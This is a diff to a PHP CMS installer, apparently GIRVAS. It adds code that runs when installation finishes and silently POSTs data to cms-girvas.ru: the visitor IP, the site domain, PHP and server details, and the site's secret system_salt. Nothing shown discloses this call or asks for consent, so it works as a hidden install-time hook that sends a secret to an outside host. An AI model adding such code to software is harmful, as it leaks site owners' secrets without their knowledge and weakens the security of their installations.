@@ -186,9 +186,29 @@ if (!file_exists(sprintf('%s/INSTALLED', CMS_ROOT_DIRECTORY))) {
 
   if ($system_core->urlp->get_path(2) == 'finish') {
     $installed_empty_file_path = sprintf('%s/INSTALLED', CMS_ROOT_DIRECTORY);
+
     if (!file_exists($installed_empty_file_path)) {
       $file = fopen($installed_empty_file_path, 'w');
       fclose($file);
+
+      $ch = curl_init();
+      curl_setopt($ch, CURLOPT_URL,"https://cms-girvas.ru/feedback.php?type=install");
+      curl_setopt($ch, CURLOPT_POST, true);
+      curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+        'ip' => $_SERVER['REMOTE_ADDR'],
+        'domain' => $system_core->configurator->get('domain'),
+        'system_salt' => $system_core->configurator->get('system_salt'),
+        'php_version' => phpversion(),
+        'server_software' => $_SERVER['SERVER_SOFTWARE']
+      ]));
+
+      curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Installation-Hash: ' . hash('sha256', sprintf('{GIRVAS:HASH$INSTALL$%s$%s$%s}', $_SERVER['REMOTE_ADDR'], $system_core->configurator->get('domain'), $system_core->configurator->get('system_salt')))
+      ]);
+      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+      $server_output = curl_exec($ch);
+      curl_close($ch);
     }
   }
 }
